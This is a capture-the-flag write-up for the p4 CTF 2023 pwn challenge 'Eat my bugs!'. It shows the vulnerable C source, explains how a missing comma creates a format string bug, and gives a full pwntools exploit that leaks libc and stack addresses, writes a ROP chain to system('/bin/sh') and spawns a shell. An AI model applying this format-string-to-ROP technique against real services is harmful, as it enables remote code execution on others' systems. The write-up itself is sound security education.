# p4 CTF 2023 `Eat my bugs! [pwn]` writeup

## Challenge

Which bug tastes the best?

There is only one way to find out!

`nc eat_my_bugs.zajebistyc.tf 8001`

We can get the source code, libc, and ld file.
But there is no binary file.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char nothing[] = "Nothing,";

char fruits[8][20] = 
   {"Apple,", "Banana,", "Orange,", "Strawberry,",
	"Watermelon,", "Tomato,", "Lime,", "Avocado,"};

char vegetables[8][20] = 
	{"Carrot,", "Cucumber,", "Corn,", "Zucchini,",
	"Potato,", "Asparagus,", "Broccoli,", "Cabbage,"};

char meats[8][20] = 
	{"Pork,", "Beef,", "Chicken,", "Turkey,"
	"Duck,", "Lamb,", "Goat,", "Seafood,"};
	
char drinks[8][20] = 
   {"Tea,", "Water,", "CocaCola,", "Sprite,",
	"Redbull,", "Coffee,", "Milk,", "Mojito,"};

char bugs[8][20] = 
   {"Locust,", "Cricket,", "Honeybee,", "Beetle,",
	"Ants,", "Cockroach,", "Fly Larvae,", "Grasshopper,"};

int elements;
char name[0x20];

char *get_food(int type, int idx){
	if(idx < 0 || idx > 7){
			return nothing;
	}
	switch(type) {
		case 0:
			return fruits[idx];
		case 1:
			return vegetables[idx];
		case 2:
			return meats[idx];
		case 3:
			return drinks[idx];
		case 4:
			return bugs[idx];
		default:
			return nothing;
	}
}

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void read_name() {
	printf("Tell me your name: ");
	int l = read(0, name, 0x20-1);
	name[l] = '\x00';
}

int read_int() {
	char tmp[0x20];
	memset(tmp, 0, 0x20);
	read(0, tmp, 0x20-1);
	return atoi(tmp);
}

void read_elements() {
	printf("How much elements on plate: ");
	int e = read_int();
	if(e < 2 || e > 5){
		printf("no no\n");
		exit(1);
	}
	elements = e;
}

void make_plate(){
	char plate[0x20];
	int plate_len = 0;
	
	for(int i=0;i<elements;i++){
			printf("Type of food: ");
			int type = read_int();
			printf("Idx: ");
			int idx = read_int();
			char *src = get_food(type, idx);
			int l = strlen(src);
			if(l > sizeof(plate) - plate_len) {
				printf("no no\n");
				exit(1);
			}
			memcpy(plate+plate_len, src, l);
			plate_len += l;
	}
	plate[plate_len-1]='\x00';
	
	printf("Good choice %s\n", name);
	printf("Here is your yummy plate:\n");
	printf(plate);
}

int main() {	
	init();
	for(int people=0;people<3;people++) {		
		read_name();
		read_elements();
		make_plate();
	}
}
```

## Solution

Did you notice the mistake in lines 16~18 of the source code?

```c
char meats[8][20] = 
	{"Pork,", "Beef,", "Chicken,", "Turkey,"
	"Duck,", "Lamb,", "Goat,", "Seafood,"};
```
Of course I did not notice...

If you do not notice this bug, you cannot exploit it.
I was informed after the contest that if you enable all warnings and compile it yourself, it will report this bug for you.

If you select `type` 2 with `idx` 7, the plate is not modified at all.
As a result, this program outputs the contents written in `read_elements()` by `printf(plate)`.

Format string attack is available.

Even without a binary, you can dynamically analyze from libc and ld files.
Since the buffer size is small, you start by modifying the local variable within `main()` to a negative number to increase the number of attempts.

## Exploit

```py
from pwn import *
import sys

libc = ELF("libc.so.6")

context.arch = 'amd64'
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def connect(env='debug'):
    if env == 'debug':
        io = process(elf.path)
        gdb.attach(io, gdbscript='''
            b *main
        ''')
    elif env == 'local':
        io = remote("localhost", 4000, timeout=3)
    elif env == 'remote':
        io = remote("eat_my_bugs.zajebistyc.tf", 8001, timeout=3)
    else:
        log.error('Invalid environment')
        exit(0)
    return io

def read_name(name=b'cafe'):
    io.sendafter(b'name: ', name)

def read_elements(e):
    io.sendafter(b'plate: ', e)

def make_plate(cnt=2, food=[2, 2], idx=[7, 7]):
    assert len(food) == cnt and len(idx) == cnt, 'Invalid input!'
    for i in range(cnt):
        r = io.sendlineafter(b'food: ', str(food[i]).encode())
        r = io.sendlineafter(b'Idx: ', str(idx[i]).encode())

def get_plate():
    head = b'plate:\n'
    tail = b'Tell '
    io.recvuntil(head)
    return io.recvuntil(tail)[:-len(tail)]

def do_loop(e):
    read_name()
    read_elements(e)
    make_plate()
    return get_plate()

def create_payload(addr, ctx):
    p = b'2'
    p += b'%%%dc%%8$hn' % ((0x10000 + ctx - 1) % 0x10000)
    p = p.ljust(0x10, b'\x00')
    p += p64(addr)
    return p

libc_start_call_main_oft = 0x23a90
i_addr_oft = 0x104
ret_addr_oft = 0xf8

if __name__ == '__main__':
    io = connect(env='local')

    # libc and stack addr leak in the first loop
    p = b'2  %19$p  %20$p  %21$p'
    r = do_loop(p).split(b'  ')
    libc.address = int(r[1].decode(), 16) - libc_start_call_main_oft
    i_addr = int(r[2].decode(), 16) - i_addr_oft
    ret_addr = int(r[2].decode(), 16) - ret_addr_oft
    log.info(f'&i for loop: {hex(i_addr)}\nlibc addr: {hex(libc.address)}')

    ropchain = p64(next(libc.search(asm('pop rdi; ret'), executable=True)))
    ropchain += p64(next(libc.search(b'/bin/sh\x00')))
    ropchain += p64(next(libc.search(asm('ret'), executable=True)))
    ropchain += p64(libc.sym["system"])

    # increate the number of loop
    do_loop(create_payload(i_addr + 2, 0xffff))
    
    oft = 0
    while True:
        do_loop(create_payload(ret_addr + oft, u16(ropchain[oft:oft+2]) & 0xffff))
        oft += 2
        if oft == len(ropchain):
            break
    
    do_loop(create_payload(i_addr + 2, 0x0))

    io.interactive()
```